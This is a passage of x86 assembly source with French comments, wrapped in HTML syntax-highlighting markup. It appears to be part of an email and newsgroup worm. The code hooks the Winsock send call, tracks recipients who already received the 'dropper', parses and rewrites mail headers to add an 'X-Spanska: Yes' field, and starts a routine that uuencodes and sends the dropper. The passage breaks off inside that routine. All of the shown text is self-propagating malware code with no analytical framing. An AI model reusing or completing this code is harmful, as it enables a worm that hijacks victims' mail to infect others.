</span><span class="sc6">jae</span><span class="sc0"> </span><span class="sc5">pas_dans_la_liste</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0A0Dh</span><span class="sc0">
</span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">compare_8_premiers_cara</span><span class="sc0">
</span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
</span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">cherche_0D0A</span><span class="sc0">

</span><span class="sc5">pas_dans_la_liste</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">smtp_recipient_size</span><span class="sc0">
</span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
</span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0A0Dh</span><span class="sc0">
</span><span class="sc6">stosw</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">              </span><span class="sc1">;addr. of structure needed for overlapped I/O (0 pour normale)</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">liste_size</span><span class="sc0">      </span><span class="sc1">;address of nb of bytes written (si jamais tout n'est pas écrit)</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">            </span><span class="sc1">;number of bytes to write</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">            </span><span class="sc1">;address of data to write to file</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">liste_handle</span><span class="sc0">       </span><span class="sc1">;handle of file to write to</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">WriteFile</span><span class="sc0">
</span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">close_mem_and_file</span><span class="sc0">      </span><span class="sc1">;test eax inutile</span><span class="sc0">

</span><span class="sc5">il_a_deja_recu_le_dropper</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">offset_mem_buffer</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">LocalFree</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">liste_handle</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">CloseHandle</span><span class="sc0">
</span><span class="sc6">popad</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc2">1</span><span class="sc0">         </span><span class="sc1">;retour avec eax=-1 si faut pas envoyer</span><span class="sc0">
</span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">close_mem_and_file</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">offset_mem_buffer</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">LocalFree</span><span class="sc0">

</span><span class="sc5">close_file</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">liste_handle</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">CloseHandle</span><span class="sc0">

</span><span class="sc5">stop_verifie_destinataire</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc1">;s'il y a le moindre probleme, on envoie quand même</span><span class="sc0">
</span><span class="sc6">popad</span><span class="sc0">
</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">            </span><span class="sc1">;retour avec eax=0 si c OK</span><span class="sc0">
</span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;*******************************************************************************************</span><span class="sc0">
</span><span class="sc1">;***                      RECUPERE LES HEADERS (MAIL OU NEWS)                            ***</span><span class="sc0">
</span><span class="sc1">;*******************************************************************************************</span><span class="sc0">

</span><span class="sc5">recupere_headers</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">pushad</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">100</span><span class="sc0">        </span><span class="sc1">;?</span><span class="sc0">
</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">

</span><span class="sc5">analyse</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0DFDFh</span><span class="sc0">              </span><span class="sc1">;fous-moi ce bordel en majuscules</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">

</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc3">"RF"</span><span class="sc0">                </span><span class="sc1">;maybe From:</span><span class="sc0">
</span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">maybe_find_from</span><span class="sc0">
</span><span class="sc5">fausse_alerte_a1</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc3">"US"</span><span class="sc0">                </span><span class="sc1">;maybe Subject:</span><span class="sc0">
</span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">maybe_find_subject</span><span class="sc0">
</span><span class="sc5">fausse_alerte_a2</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc3">"EN"</span><span class="sc0">                </span><span class="sc1">;maybe Newsgroups:</span><span class="sc0">
</span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">maybe_find_newsgroups</span><span class="sc0">
</span><span class="sc5">fausse_alerte_a3</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc3">"CC"</span><span class="sc0">                </span><span class="sc1">;maybe CC:</span><span class="sc0">
</span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">maybe_find_cc</span><span class="sc0">
</span><span class="sc5">fausse_alerte_a4</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc3">"CB"</span><span class="sc0">                </span><span class="sc1">;maybe BCC:</span><span class="sc0">
</span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">maybe_find_bcc</span><span class="sc0">
</span><span class="sc5">fausse_alerte_a5</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0A0Dh</span><span class="sc0">               </span><span class="sc1">;maybe end of headers</span><span class="sc0">
</span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">maybe_end_headers</span><span class="sc0">
</span><span class="sc5">fausse_alerte_a6</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">
</span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
</span><span class="sc6">jae</span><span class="sc0"> </span><span class="sc5">stop_analyse_headers</span><span class="sc0">        </span><span class="sc1">;in case of header end or</span><span class="sc0">
</span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">analyse</span><span class="sc0">

</span><span class="sc5">maybe_find_from</span><span class="sc4">:</span><span class="sc0">            </span><span class="sc1">;From:</span><span class="sc0">
</span><span class="sc6">lodsw</span><span class="sc0">
</span><span class="sc6">lodsd</span><span class="sc0">
</span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFFFDFDFh</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc3">" :MO"</span><span class="sc0">
</span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">fausse_alerte_a1</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">recupere_un_champ</span><span class="sc0">
</span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">analyse</span><span class="sc0">

</span><span class="sc5">maybe_find_subject</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc1">;Subject:</span><span class="sc0">
</span><span class="sc6">lodsw</span><span class="sc0">
</span><span class="sc6">lodsd</span><span class="sc0">
</span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0DFDFDFDFh</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc3">"CEJB"</span><span class="sc0">
</span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">fausse_alerte_a2</span><span class="sc0">
</span><span class="sc6">lodsd</span><span class="sc0">
</span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFFFDFh</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc4">+</span><span class="sc3">" :T"</span><span class="sc0">
</span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">fausse_alerte_a2</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">recupere_un_champ</span><span class="sc0">
</span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">analyse</span><span class="sc0">

</span><span class="sc5">maybe_find_newsgroups</span><span class="sc4">:</span><span class="sc0">          </span><span class="sc1">;Newsgroups:</span><span class="sc0">
</span><span class="sc6">lodsw</span><span class="sc0">
</span><span class="sc6">lodsd</span><span class="sc0">
</span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0DFDFDFDFh</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc3">"RGSW"</span><span class="sc0">
</span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">fausse_alerte_a3</span><span class="sc0">
</span><span class="sc6">lodsd</span><span class="sc0">
</span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0DFDFDFDFh</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc3">"SPUO"</span><span class="sc0">
</span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">fausse_alerte_a3</span><span class="sc0">
</span><span class="sc6">lodsw</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc3">" :"</span><span class="sc0">
</span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">fausse_alerte_a3</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">recupere_un_champ</span><span class="sc0">
</span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">analyse</span><span class="sc0">

</span><span class="sc5">maybe_find_cc</span><span class="sc4">:</span><span class="sc0">              </span><span class="sc1">;CC:</span><span class="sc0">
</span><span class="sc6">lodsw</span><span class="sc0">
</span><span class="sc6">lodsd</span><span class="sc0">
</span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFFFh</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc4">+</span><span class="sc2">0</span><span class="sc4">+</span><span class="sc3">" :"</span><span class="sc0">
</span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">fausse_alerte_a4</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">recupere_un_champ</span><span class="sc0">
</span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">analyse</span><span class="sc0">

</span><span class="sc5">maybe_find_bcc</span><span class="sc4">:</span><span class="sc0">             </span><span class="sc1">;BCC:</span><span class="sc0">
</span><span class="sc6">lodsw</span><span class="sc0">
</span><span class="sc6">lodsd</span><span class="sc0">
</span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFFFDFh</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc4">+</span><span class="sc3">" :C"</span><span class="sc0">
</span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">fausse_alerte_a5</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">recupere_un_champ</span><span class="sc0">
</span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">analyse</span><span class="sc0">

</span><span class="sc5">maybe_end_headers</span><span class="sc4">:</span><span class="sc0">          </span><span class="sc1">;end of headers</span><span class="sc0">
</span><span class="sc6">lodsd</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0A0D0A0Dh</span><span class="sc0">
</span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">fausse_alerte_a6</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

</span><span class="sc1">;----rajoute mon petit champ dans le header</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc3">"pS-X"</span><span class="sc0">         </span><span class="sc1">;"X-Spanska: Yes" to allow easy filtering :)</span><span class="sc0">
</span><span class="sc6">stosd</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc3">"ksna"</span><span class="sc0">
</span><span class="sc6">stosd</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc3">"Y :a"</span><span class="sc0">
</span><span class="sc6">stosd</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc3">"se"</span><span class="sc0">
</span><span class="sc6">stosw</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">14</span><span class="sc0">

</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">stosd</span><span class="sc0">
</span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
</span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc5">size_headers</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">           </span><span class="sc1">;in case of OK</span><span class="sc0">
</span><span class="sc6">popad</span><span class="sc0">
</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">stop_analyse_headers</span><span class="sc4">:</span><span class="sc0">           </span><span class="sc1">;in case of error</span><span class="sc0">

</span><span class="sc6">popad</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc2">1</span><span class="sc0">
</span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">recupere_un_champ</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">offset_mem_buffer2_headers</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
</span><span class="sc5">recopie</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">lodsb</span><span class="sc0">
</span><span class="sc6">stosb</span><span class="sc0">
</span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2950</span><span class="sc0">
</span><span class="sc6">ja</span><span class="sc0"> </span><span class="sc5">stop_recupere_un_champ</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0Ah</span><span class="sc0">
</span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">recopie</span><span class="sc0">
</span><span class="sc5">stop_recupere_un_champ</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;*******************************************************************************************</span><span class="sc0">
</span><span class="sc1">;***                                  ENVOIE                                             ***</span><span class="sc0">
</span><span class="sc1">;*******************************************************************************************</span><span class="sc0">

</span><span class="sc5">envoie</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

</span><span class="sc5">envoie2</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">LARGE</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">LARGE</span><span class="sc0"> </span><span class="sc5">no_socket</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">original_send</span><span class="sc4">]</span><span class="sc0">

</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc2">1</span><span class="sc0">
</span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">envoi_ok</span><span class="sc0">

</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">WSAGetLastError</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">10035</span><span class="sc0">
</span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">stop_envoi</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">
</span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">envoie2</span><span class="sc0">

</span><span class="sc5">stop_envoi</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc2">1</span><span class="sc0">
</span><span class="sc5">envoi_ok</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;*******************************************************************************************</span><span class="sc0">
</span><span class="sc1">;***               RECUPERE TAILLE ET CONTENU DE L'ENVOI EN COURS                        ***</span><span class="sc0">
</span><span class="sc1">;*******************************************************************************************</span><span class="sc0">

</span><span class="sc5">recuperer_offset_et_taille_envoi</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">32</span><span class="sc4">+(</span><span class="sc2">5</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">)]</span><span class="sc0"> </span><span class="sc1">;offset du contenu envoyé</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">32</span><span class="sc4">+(</span><span class="sc2">6</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">)]</span><span class="sc0"> </span><span class="sc1">;taille du contenu</span><span class="sc0">
</span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;*******************************************************************************************</span><span class="sc0">
</span><span class="sc1">;***               RECUPERE No SOCKET ET OFFSET DU SEND ORIGINAL                         ***</span><span class="sc0">
</span><span class="sc1">;*******************************************************************************************</span><span class="sc0">

</span><span class="sc5">recuperer_socket_et_original_send</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc1">;----- récupérer no de socket</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">32</span><span class="sc4">+(</span><span class="sc2">4</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">)]</span><span class="sc0"> </span><span class="sc1">;no de socket</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc5">no_socket</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">

</span><span class="sc1">;----- récupérer le saut au send original</span><span class="sc0">

</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">34</span><span class="sc4">+</span><span class="sc2">25</span><span class="sc0">      </span><span class="sc1">;ATTENTION!! dépend du dropper!!!!!!!!!!!!!</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">;recup du saut relatif depuis la fin du patch jusqu'au send original</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc5">original_send</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
</span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;*******************************************************************************************</span><span class="sc0">
</span><span class="sc1">;***                         UUCODE ET ENVOIE LE DROPPER                                 ***</span><span class="sc0">
</span><span class="sc1">;*******************************************************************************************</span><span class="sc0">

</span><span class="sc5">uucode_et_envoie</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc1">;------- se réserver 20 Ko de mémoire</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">20</span><span class="sc4">*</span><span class="sc2">1024</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">40h</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">LocalAlloc</span><span class="sc0">
</span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">fin_routine_uucodage</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc5">offset_mem_buffer</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

</span><span class="sc1">;------- récupérer le path/nom du dropper</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">100</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">offset_mem_buffer2_system_dir</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">GetSystemDirectoryA</span><span class="sc0">        </span><span class="sc1">;généralement C:\WINDOWS</span><span class="sc0">
</span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">fin_routine_uucodage_avec_liberer_memoire</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc5">system_dir_size</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

